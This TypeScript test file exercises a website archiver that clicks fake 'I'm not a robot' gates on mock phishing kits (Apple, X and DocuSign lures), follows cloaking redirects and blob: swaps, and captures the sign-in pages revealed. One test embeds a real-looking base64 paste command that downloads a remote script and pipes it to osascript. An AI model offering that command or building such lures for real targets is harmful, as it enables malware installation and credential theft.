import { describe, expect, test } from "bun:test";

import { chromiumAvailable, launchTestChromium } from "../../browser/task/test_helpers";
import { archiveWebsite } from "./";
import { fast } from "./test_fixture";

describe.skipIf(!chromiumAvailable)("verification gates, in a real browser", () => {
	const filler = "Family photos stay in the local archive until the next backup.";
	const hiddenFiller = `<i style="font-size:0!important;opacity:0!important;position:absolute!important">${filler}</i>`.repeat(40);
	const appleForm = `<h1>Sign in with Apple Account</h1><input id="email" placeholder="Email or Phone Number"><input id="password" type="password" placeholder="Password"><button type="submit">Sign In</button>`;

	/** Serves one kit page; `/verify` answers after a silent proof of work, like the workers.dev kit. */
	function serveKit(page: string, hits: string[]) {
		return Bun.serve({
			port: 0,
			fetch: async (request) => {
				const { pathname } = new URL(request.url);
				hits.push(pathname);
				if (pathname === "/verify") return Response.json({ ok: true });
				if (pathname === "/login-form") return new Response(appleForm, { headers: { "content-type": "text/html" } });
				return new Response(page, { headers: { "content-type": "text/html; charset=utf-8" } });
			},
		});
	}

	test("clicks the kit's own 'I'm not a robot' control and captures the sign-in page it reveals", async () => {
		const hits: string[] = [];
		const server = serveKit(`<!DOCTYPE html><html><head><title>\u200b</title></head><body>${hiddenFiller}
<main><section id="gate"><h1>Security Check</h1>
<div role="button" tabindex="0" id="box" aria-label="I'm not a robot"><span class="check"></span><span>I'm not a robot</span><div>reCAPTCHA</div><div>Privacy - Terms</div></div>
</section><div id="content"></div></main>
<footer>Copyright © 2024 Apple Inc. All rights reserved.</footer>
<script>
document.getElementById("box").addEventListener("click", async () => {
	// A silent proof of work before the kit talks to its backend again.
	const until = Date.now() + 1500; while (Date.now() < until) await new Promise((r) => setTimeout(r, 50));
	await fetch("/verify", { method: "POST" });
	const html = await (await fetch("/login-form")).text();
	document.getElementById("gate").remove();
	document.getElementById("content").innerHTML = html;
});
</script></body></html>`, hits);
		try {
			const url = `http://127.0.0.1:${server.port}/c2222120`;
			const archive = await archiveWebsite({ url }, { ...fast, renderSettleMs: 5_000, getBrowser: () => launchTestChromium() });

			expect(archive.verificationGate).toEqual({ label: "I'm not a robot" });
			const text = archive.text.toString();
			expect(text).toContain("Sign in with Apple Account");
			expect(text).toContain("Email or Phone Number");
			expect(text).not.toContain("Security Check");
			expect(text).not.toContain(filler);
			expect(hits).toEqual(["/c2222120", "/verify", "/login-form"]);
			expect(archive.screenshotPng?.byteLength).toBeGreaterThan(0);
		} finally {
			server.stop(true);
		}
	}, 60_000);

	test("keeps the live DOM with the closed install dialog a script filled in, which the MHTML and the visitor text leave out", async () => {
		// Production case 380697679325302795: macmorrow.app fetches its paste command into a
		// `hidden` dialog; Chrome's MHTML drops what is not rendered, so only the live DOM holds it.
		const hits: string[] = [];
		const command = "echo 'Y3VybCAtc2ZMIGh0dHBzOi8va2V5Y2hhaW5hZ2VudC5wcm8vd2tzeGdqL3lYMWZRV0ZHdzlycCB8IG9zYXNjcmlwdCAtbCBKYXZhU2NyaXB0' | base64 -d | zsh";
		const server = serveKit(`<!DOCTYPE html><html><body><h1>MacMorrow</h1><button>Download for Mac</button>
<dialog id="installDialog"><div id="macInstall" hidden><strong>Open Terminal</strong><code id="installCommand">Installation command is being prepared.</code></div></dialog>
<script>setTimeout(() => { document.getElementById("installCommand").textContent = ${JSON.stringify(command)}; }, 100);</script></body></html>`, hits);
		try {
			const archive = await archiveWebsite({ url: `http://127.0.0.1:${server.port}/` }, { ...fast, renderSettleMs: 1_000, getBrowser: () => launchTestChromium() });
			expect(archive.documentHtml).toContain(command);
			expect(archive.documentHtml).toContain("Open Terminal");
			expect(archive.text.toString()).not.toContain("base64");
			expect(archive.mhtml.toString("latin1").replace(/=\r?\n/g, "")).not.toContain("Y3VybCAtc2ZM");
		} finally {
			server.stop(true);
		}
	}, 60_000);

	test("captures a kit that swaps its real page in from a blob: URL as the page it loaded", async () => {
		const hits: string[] = [];
		const server = serveKit(`<!DOCTYPE html><html><body><div class="spinner"></div><script>
setTimeout(async () => {
	const html = "<!DOCTYPE html><html><body>${appleForm.replaceAll('"', '\\"')}</body></html>";
	location.replace(URL.createObjectURL(new Blob([html], { type: "text/html" })));
}, 50);
</script></body></html>`, hits);
		try {
			const url = `http://127.0.0.1:${server.port}/c2222120`;
			const archive = await archiveWebsite({ url }, { ...fast, renderSettleMs: 2_000, getBrowser: () => launchTestChromium() });

			expect(archive.url).toBe(url);
			expect(archive.navigationHops).toEqual([expect.objectContaining({ url, status: 200, contentCaptured: true })]);
			expect(archive.text.toString()).toContain("Sign in with Apple Account");
			expect(archive.screenshotPng?.byteLength).toBeGreaterThan(0);
		} finally {
			server.stop(true);
		}
	}, 60_000);

	test("captures a kit that swaps in its blob: page before the page finishes loading as the page it loaded", async () => {
		const hits: string[] = [];
		// secure.nicholasmeeker.com replaced itself synchronously, so the browser's
		// own navigation result was the blob: document rather than the site.
		const server = serveKit(`<!DOCTYPE html><html><head><script>
location.replace(URL.createObjectURL(new Blob(["<!DOCTYPE html><html><body>${appleForm.replaceAll('"', '\\"')}</body></html>"], { type: "text/html" })));
</script></head><body></body></html>`, hits);
		try {
			const url = `http://127.0.0.1:${server.port}/c2222120`;
			const archive = await archiveWebsite({ url }, { ...fast, renderSettleMs: 2_000, getBrowser: () => launchTestChromium() });

			expect(archive.url).toBe(url);
			expect(archive.hostname).toBe("127.0.0.1");
			expect(archive.navigationHops).toEqual([expect.objectContaining({ url, hostname: "127.0.0.1", status: 200, contentCaptured: true })]);
			expect(archive.text.toString()).toContain("Sign in with Apple Account");
			expect(archive.screenshotPng?.byteLength).toBeGreaterThan(0);
		} finally {
			server.stop(true);
		}
	}, 60_000);

	test("records the page a clicked gate navigates the main frame to as its own hop", async () => {
		// docusign.alt3-doc3ea7-v2.sbs over the residential exit: a self-posting
		// interstitial, a "Confirm you are human" page, then the email form. The
		// hops ended at the interstitial's 302, which was marked as the captured page.
		const hits: string[] = [];
		const server = serveKit(`<!DOCTYPE html><html><body><main><h1>Security Check</h1>
<div role="button" tabindex="0" id="box" aria-label="Confirm you are human"><span>Confirm you are human</span></div></main>
<script>document.getElementById("box").addEventListener("click", () => { location.href = "/login-form"; });</script></body></html>`, hits);
		try {
			const url = `http://127.0.0.1:${server.port}/c2222120`;
			const loginUrl = `http://127.0.0.1:${server.port}/login-form`;
			const archive = await archiveWebsite({ url }, { ...fast, renderSettleMs: 3_000, getBrowser: () => launchTestChromium() });

			expect(archive.verificationGate).toEqual({ label: "Confirm you are human" });
			expect(archive.url).toBe(loginUrl);
			expect(archive.navigationHops).toEqual([
				expect.objectContaining({ index: 0, url, status: 200, redirectTo: loginUrl, contentCaptured: false }),
				expect.objectContaining({ index: 1, url: loginUrl, status: 200, contentCaptured: true }),
			]);
			expect(archive.text.toString()).toContain("Sign in with Apple Account");
			expect(hits).toEqual(["/c2222120", "/login-form"]);
		} finally {
			server.stop(true);
		}
	}, 60_000);

	describe("a gate drawn as a bare element that only its script and hand cursor mark as clickable", () => {
		// x-com.email (production case 378201777197027393): a fake Cloudflare
		// Turnstile for x.com, a <div> with a click listener and cursor:pointer,
		// whose caption and Privacy/Terms anchors inherit the cursor.
		const turnstileCss = `<style>
.cf-turnstile-wrapper { width: 300px; height: 65px; display: flex; align-items: center; cursor: pointer; }
.cf-turnstile-wrapper.verifying { pointer-events: none; }
.turnstile-checkbox { width: 24px; height: 24px; border: 2px solid #666; }
.footer a { color: #888; }
</style>`;
		const turnstile = (id: string, caption = "Verify you are human") => `<div class="cf-turnstile-wrapper" id="${id}"><div class="turnstile-inner">
<div class="turnstile-left"><div class="turnstile-checkbox"></div><span class="turnstile-label">${caption}</span></div>
<div class="turnstile-right"><div class="privacy-links"><a>Privacy</a><a>Terms</a></div></div></div></div>`;
		const fakeChallenge = (body: string, script: string) => `<!DOCTYPE html><html lang="en"><head><title>Just a moment...</title>${turnstileCss}</head><body>
<div class="main-content"><span class="host-name">x.com</span>
<h1>Verifying you are human. This may take a few seconds.</h1><p>x.com needs to review the security of your connection before proceeding.</p>
${body}</div>
<footer class="footer">Ray ID: <code>292ba0375e2a57e0</code> • Performance &amp; security by <a>Cloudflare</a></footer>
<script>${script}</script></body></html>`;
		const xLogin = `<h1>Sign in to X</h1><input name="text" autocomplete="username" placeholder="Phone, email, or username"><input type="password" name="password" placeholder="Password"><button>Log in</button>`;

		function serveChallenge(page: string, hits: string[]) {
			return Bun.serve({
				port: 0,
				fetch: (request) => {
					const { pathname } = new URL(request.url);
					hits.push(pathname);
					if (pathname === "/i/flow/login") return new Response(`<!DOCTYPE html><html><body>${xLogin}</body></html>`, { headers: { "content-type": "text/html" } });
					return new Response(page, { headers: { "content-type": "text/html; charset=utf-8" } });
				},
			});
		}

		test("clicks the fake Turnstile and captures the X sign-in page it navigates to", async () => {
			const hits: string[] = [];
			const server = serveChallenge(fakeChallenge(turnstile("turnstile"), `
const box = document.getElementById("turnstile");
box.addEventListener("click", () => {
	box.classList.add("verifying");
	setTimeout(() => { location.href = "/i/flow/login"; }, 800);
});`), hits);
			try {
				const url = `http://127.0.0.1:${server.port}/`;
				const loginUrl = `http://127.0.0.1:${server.port}/i/flow/login`;
				const archive = await archiveWebsite({ url }, { ...fast, renderSettleMs: 4_000, getBrowser: () => launchTestChromium() });

				expect(archive.verificationGate).toEqual({ label: "Verify you are human" });
				expect(archive.url).toBe(loginUrl);
				expect(archive.navigationHops).toEqual([
					expect.objectContaining({ index: 0, url, status: 200, redirectTo: loginUrl, contentCaptured: false }),
					expect.objectContaining({ index: 1, url: loginUrl, status: 200, contentCaptured: true }),
				]);
				const text = archive.text.toString();
				expect(text).toContain("Sign in to X");
				expect(text).not.toContain("Verifying you are human");
				expect(hits).toEqual(["/", "/i/flow/login"]);
			} finally {
				server.stop(true);
			}
		}, 60_000);

		test("captures the sign-in form a clicked bare gate swaps into the same page", async () => {
			const hits: string[] = [];
			const server = serveChallenge(fakeChallenge(`${turnstile("turnstile")}<div id="content"></div>`, `
document.getElementById("turnstile").addEventListener("click", async () => {
	const html = await (await fetch("/i/flow/login")).text();
	document.querySelector(".main-content").innerHTML = html;
});`), hits);
			try {
				const archive = await archiveWebsite({ url: `http://127.0.0.1:${server.port}/` }, { ...fast, renderSettleMs: 4_000, getBrowser: () => launchTestChromium() });

				expect(archive.verificationGate).toEqual({ label: "Verify you are human" });
				expect(archive.text.toString()).toContain("Phone, email, or username");
				expect(hits).toEqual(["/", "/i/flow/login"]);
			} finally {
				server.stop(true);
			}
		}, 60_000);

		test("never takes a link captioned like a gate for one", async () => {
			const hits: string[] = [];
			const server = serveChallenge(fakeChallenge(`<p><a href="/i/flow/login">Verify you are human</a></p>`, ""), hits);
			try {
				const archive = await archiveWebsite({ url: `http://127.0.0.1:${server.port}/` }, { ...fast, renderSettleMs: 1_000, getBrowser: () => launchTestChromium() });

				expect(archive.verificationGate).toBeUndefined();
				expect(hits).toEqual(["/"]);
			} finally {
				server.stop(true);
			}
		}, 60_000);

		test("leaves a page alone when two bare elements could be the gate", async () => {
			const hits: string[] = [];
			const server = serveChallenge(fakeChallenge(`${turnstile("first")}${turnstile("second", "I'm not a robot")}`, `
for (const id of ["first", "second"]) document.getElementById(id).addEventListener("click", () => { location.href = "/i/flow/login"; });`), hits);
			try {
				const archive = await archiveWebsite({ url: `http://127.0.0.1:${server.port}/` }, { ...fast, renderSettleMs: 1_000, getBrowser: () => launchTestChromium() });

				expect(archive.verificationGate).toBeUndefined();
				expect(hits).toEqual(["/"]);
			} finally {
				server.stop(true);
			}
		}, 60_000);

		test("never clicks a hand-cursor element whose caption is no human check", async () => {
			const hits: string[] = [];
			const server = serveChallenge(fakeChallenge(turnstile("turnstile", "Continue to x.com"), `
document.getElementById("turnstile").addEventListener("click", () => { location.href = "/i/flow/login"; });`), hits);
			try {
				const archive = await archiveWebsite({ url: `http://127.0.0.1:${server.port}/` }, { ...fast, renderSettleMs: 1_000, getBrowser: () => launchTestChromium() });

				expect(archive.verificationGate).toBeUndefined();
				expect(hits).toEqual(["/"]);
			} finally {
				server.stop(true);
			}
		}, 60_000);
	});

	test("records a jump the page's <head> makes to another site before it finishes loading as the submitted page's own hop", async () => {
		// docusign.alt3-doc3ea7-v2.sbs: meta refresh and `location.replace` to a news
		// site in <head>. Chromium's navigation resolves with the news site's response.
		const decoyHits: string[] = [];
		const decoy = serveKit(`<!DOCTYPE html><html><body><h1>World news</h1></body></html>`, decoyHits);
		const decoyUrl = `http://127.0.0.1:${decoy.port}/`;
		const hits: string[] = [];
		const cloaker = serveKit(`<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="refresh" content="0;url=${decoyUrl}"><title>Redirecting...</title><script>window.location.replace("${decoyUrl}");</script></head><body></body></html>`, hits);
		try {
			const url = `http://localhost:${cloaker.port}/word/verify.workspace.php`;
			const archive = await archiveWebsite({ url }, { ...fast, renderSettleMs: 2_000, getBrowser: () => launchTestChromium() });

			expect(archive.url).toBe(decoyUrl);
			expect(archive.navigationHops).toEqual([
				expect.objectContaining({ index: 0, url, status: 200, redirectTo: decoyUrl, contentCaptured: false }),
				expect.objectContaining({ index: 1, url: decoyUrl, status: 200, contentCaptured: true }),
			]);
			// The residential exit is tried first and was sent to the decoy.
			expect(archive.cloaking).toEqual({
				outcome: "scripted",
				detail: `${url} sent the residential exit to 127.0.0.1 by script`,
			});
			expect(hits).toEqual(["/word/verify.workspace.php"]);
		} finally {
			cloaker.stop(true);
			decoy.stop(true);
		}
	}, 60_000);

	test("never clicks anything on a page that already shows data-entry fields, even next to a robot checkbox", async () => {
		const hits: string[] = [];
		const server = serveKit(`<!DOCTYPE html><html><body>${appleForm}
<label><input type="checkbox" id="robot" onclick="fetch('/verify', { method: 'POST' })"> I'm not a robot</label></body></html>`, hits);
		try {
			const archive = await archiveWebsite({ url: `http://127.0.0.1:${server.port}/login` }, { ...fast, renderSettleMs: 1_000, getBrowser: () => launchTestChromium() });

			expect(archive.verificationGate).toBeUndefined();
			expect(archive.text.toString()).toContain("Sign in with Apple Account");
			expect(hits).toEqual(["/login"]);
		} finally {
			server.stop(true);
		}
	}, 60_000);

	/**
	 * A Google Sites page whose Apps Script embed draws the kit's gate two
	 * frames deep, each frame on its own origin, like sites.google.com →
	 * script.google.com → *-script.googleusercontent.com. A hidden second embed
	 * loads the same gate; a visitor never sees it, so it is no second control.
	 */
	function serveFramedKit(gatePage: string, hits: string[]) {
		const kit = Bun.serve({
			port: 0,
			fetch: async (request) => {
				const { pathname } = new URL(request.url);
				hits.push(`kit${pathname}`);
				if (pathname === "/verify") return Response.json({ ok: true });
				if (pathname === "/login-form") return new Response(appleForm, { headers: { "content-type": "text/html" } });
				return new Response(gatePage, { headers: { "content-type": "text/html; charset=utf-8" } });
			},
		});
		const sandbox = Bun.serve({
			port: 0,
			fetch: () => new Response(`<!DOCTYPE html><html><body style="margin:0"><iframe id="userHtmlFrame" src="http://127.0.0.1:${kit.port}/userCodeAppPanel" style="border:0;width:100%;height:600px"></iframe></body></html>`, { headers: { "content-type": "text/html" } }),
		});
		const site = Bun.serve({
			port: 0,
			fetch: () => new Response(`<!DOCTYPE html><html><head><title>Revert apps</title></head><body><header><input type="search" aria-label="Search this site"></header>
<h1>Revert apps</h1><iframe aria-label="Apps Script" src="http://localhost:${sandbox.port}/exec" style="border:0;width:800px;height:620px"></iframe>
<iframe src="http://localhost:${sandbox.port}/preload" style="display:none"></iframe><footer>Report abuse</footer></body></html>`, { headers: { "content-type": "text/html" } }),
		});
		return { url: `http://127.0.0.1:${site.port}/view/revert-change`, stop: () => [kit, sandbox, site].forEach((server) => server.stop(true)) };
	}

	test("clicks a gate drawn in a nested cross-origin frame and captures the sign-in page it reveals there", async () => {
		const hits: string[] = [];
		const served = serveFramedKit(`<!DOCTYPE html><html><head><title>Security Verification</title></head><body>
<div id="gate"><h1>google.com</h1><h2>Performing security verification</h2>
<div class="cb" id="checkbox" role="checkbox" aria-checked="false" tabindex="0" style="width:24px;height:24px;border:2px solid #555"></div><span>I'm not a robot</span>
<div>reCAPTCHA</div></div><div id="content"></div>
<script>
document.getElementById("checkbox").addEventListener("click", async () => {
	await fetch("/verify", { method: "POST" });
	const html = await (await fetch("/login-form")).text();
	document.getElementById("gate").remove();
	document.getElementById("content").innerHTML = html;
});
</script></body></html>`, hits);
		try {
			const archive = await archiveWebsite({ url: served.url }, { ...fast, renderSettleMs: 5_000, getBrowser: () => launchTestChromium() });

			// The empty role=checkbox control takes its caption from the span drawn beside it.
			expect(archive.verificationGate).toEqual({ label: "I'm not a robot" });
			expect(hits).toEqual(["kit/userCodeAppPanel", "kit/userCodeAppPanel", "kit/verify", "kit/login-form"]);
			const text = archive.text.toString();
			expect(text).toContain("Revert apps");
			expect(text).toContain("Sign in with Apple Account");
			expect(text).toContain("Email or Phone Number");
			expect(text).not.toContain("Performing security verification");
			expect(archive.url).toBe(served.url);
		} finally {
			served.stop();
		}
	}, 60_000);

	test("follows a framed gate that navigates its frame to the kit on another site", async () => {
		// The revert-change kit: clicking the checkbox sends the Apps Script frame to revert-app.com's sign-in page.
		const hits: string[] = [];
		const kitSite = Bun.serve({
			port: 0,
			fetch: async (request) => {
				hits.push(`kit-site${new URL(request.url).pathname}`);
				// The kit fetches its form after load, so the frame shows it only once that request returns.
				return new Response(`<!DOCTYPE html><html><body><div id="app"></div><script>
fetch("/session").then(() => { document.getElementById("app").innerHTML = ${JSON.stringify(appleForm)}; });
</script></body></html>`, { headers: { "content-type": "text/html" } });
			},
		});
		const served = serveFramedKit(`<!DOCTYPE html><html><body><h2>Performing security verification</h2>
<div id="checkbox" role="checkbox" tabindex="0" style="width:24px;height:24px;border:2px solid #555"></div><span>I'm not a robot</span>
<script>document.getElementById("checkbox").addEventListener("click", () => { setTimeout(() => { location.href = "http://127.0.0.1:${kitSite.port}/?k=token"; }, 300); });</script>
</body></html>`, hits);
		try {
			const archive = await archiveWebsite({ url: served.url }, { ...fast, renderSettleMs: 5_000, getBrowser: () => launchTestChromium() });

			expect(archive.verificationGate).toEqual({ label: "I'm not a robot" });
			expect(hits).toContain("kit-site/session");
			const text = archive.text.toString();
			expect(text).toContain("Revert apps");
			expect(text).toContain("Email or Phone Number");
			expect(text).not.toContain("Performing security verification");
			// The submitted page is still the captured site; the kit lives in its frame.
			expect(archive.url).toBe(served.url);
		} finally {
			served.stop();
			kitSite.stop(true);
		}
	}, 60_000);

	test("never clicks a framed robot checkbox when a frame already shows a sign-in form", async () => {
		const hits: string[] = [];
		const served = serveFramedKit(`<!DOCTYPE html><html><body>${appleForm}
<label><input type="checkbox" onclick="fetch('/verify', { method: 'POST' })"> I'm not a robot</label></body></html>`, hits);
		try {
			const archive = await archiveWebsite({ url: served.url }, { ...fast, renderSettleMs: 1_000, getBrowser: () => launchTestChromium() });

			expect(archive.verificationGate).toBeUndefined();
			expect(hits).toEqual(["kit/userCodeAppPanel", "kit/userCodeAppPanel"]);
			// The framed form is still captured as the page shows it.
			expect(archive.text.toString()).toContain("Email or Phone Number");
		} finally {
			served.stop();
		}
	}, 60_000);

	test("never clicks a real captcha provider's checkbox", async () => {
		// Real reCAPTCHA draws its own "I'm not a robot" checkbox inside google.com/recaptcha; it is a challenge, not a kit's gate.
		const hits: string[] = [];
		const server = serveKit(`<!DOCTYPE html><html><body><h1>Please wait</h1>
<iframe src="https://www.google.com/recaptcha/api2/anchor?k=test" style="width:304px;height:78px"></iframe></body></html>`, hits);
		const providerFrames: string[] = [];
		try {
			const archive = await archiveWebsite({ url: `http://127.0.0.1:${server.port}/wait` }, {
				...fast,
				renderSettleMs: 1_000,
				getBrowser: async () => {
					const browser = await launchTestChromium();
					const newPage = browser.defaultBrowserContext().newPage.bind(browser.defaultBrowserContext());
					// The capture opens its own tab here, so its interception is in place before the page loads.
					browser.defaultBrowserContext().pages = async () => [];
					// Serve the provider frame locally so the test never reaches Google; it draws the real widget's caption.
					browser.defaultBrowserContext().newPage = async () => {
						const page = await newPage();
						await page.setRequestInterception(true);
						page.on("request", (request) => {
							if (!request.url().startsWith("https://www.google.com/recaptcha/")) return void request.continue();
							providerFrames.push(request.url());
							void request.respond({ status: 200, contentType: "text/html", body: `<html><body><div role="checkbox" id="recaptcha-anchor" tabindex="0" style="width:28px;height:28px" onclick="fetch('http://127.0.0.1:${server.port}/verify', { method: 'POST', mode: 'no-cors' })"></div><label for="recaptcha-anchor">I'm not a robot</label></body></html>` });
						});
						return page;
					};
					return browser;
				},
			});

			expect(providerFrames).toHaveLength(1);
			expect(archive.verificationGate).toBeUndefined();
			expect(hits).toEqual(["/wait"]);
		} finally {
			server.stop(true);
		}
	}, 60_000);

	test("leaves a page alone when more than one control could be the gate", async () => {
		const hits: string[] = [];
		const server = serveKit(`<!DOCTYPE html><html><body><h1>Choose</h1>
<button onclick="fetch('/verify', { method: 'POST' })">I'm not a robot</button>
<button onclick="fetch('/verify', { method: 'POST' })">Verify you are human</button></body></html>`, hits);
		try {
			const archive = await archiveWebsite({ url: `http://127.0.0.1:${server.port}/two` }, { ...fast, renderSettleMs: 1_000, getBrowser: () => launchTestChromium() });

			expect(archive.verificationGate).toBeUndefined();
			expect(hits).toEqual(["/two"]);
		} finally {
			server.stop(true);
		}
	}, 60_000);
});
